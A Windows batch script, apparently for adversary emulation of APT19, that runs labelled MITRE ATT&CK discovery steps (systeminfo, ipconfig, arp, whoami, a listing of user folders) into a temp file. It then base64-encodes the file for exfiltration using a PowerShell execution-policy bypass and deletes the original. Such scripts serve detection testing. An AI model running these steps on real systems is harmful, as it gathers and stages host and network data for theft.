@ECHO OFF
CLS
color 0E


ECHO ===========================================================================
ECHO Technique: System Information Discovery (T1082)
ECHO.
ECHO [+] System Information Discovery using builtin Utilities
ECHO ----------------------------------------------------------
mkdir %temp%\APT19
powershell -ep bypass $Env:processor_architecture;[System.Environment]::Is64BitOperatingSystem > %temp%\APT19\sysinfo
cmd.exe /c ver >> %temp%\APT19\sysinfo
cmd.exe /c systeminfo >> %temp%\APT19\sysinfo
ECHO.
ECHO.
ECHO.
ECHO ===================================================================
ECHO Technique: System Network Configuration Discovery (T1016)
ECHO.
ECHO [+] System Network Configuration Discovery using builtin Utilities
ECHO -------------------------------------------------------------------
cmd /c ipconfig /all >> %temp%\APT19\sysinfo
cmd /c arp -a >> %temp%\APT19\sysinfo
cmd /c getmac /s 127.0.0.1 >> %temp%\APT19\sysinfo
ECHO.
ECHO.
ECHO.
ECHO ===================================================================
ECHO Technique: System Owner/User Discovery	(T1033)
ECHO.
ECHO [+] Discovery using builtin Utilities
ECHO -------------------------------------------------------------------
dir C:\users\ >> %temp%\APT19\sysinfo
cmd.exe /C whoami >> %temp%\APT19\sysinfo
ECHO.
ECHO.
ECHO.
ECHO ===================================================================
ECHO Technique: Data Encoding (T1132)
ECHO.
ECHO [+] Data Encoding for Exfiltration
ECHO -------------------------------------------------------------------
powershell -ep bypass "$File1='%temp%\APT19\sysinfo';$Content1=get-content $File1;$Bytes=[System.Text.Encoding]::UTF8.GetBytes($Content1);$Encoded=[System.Convert]::ToBase64String($Bytes);$Encoded | set-content ($File1 + '.b64'); Remove-Item –path $File1"
ECHO.
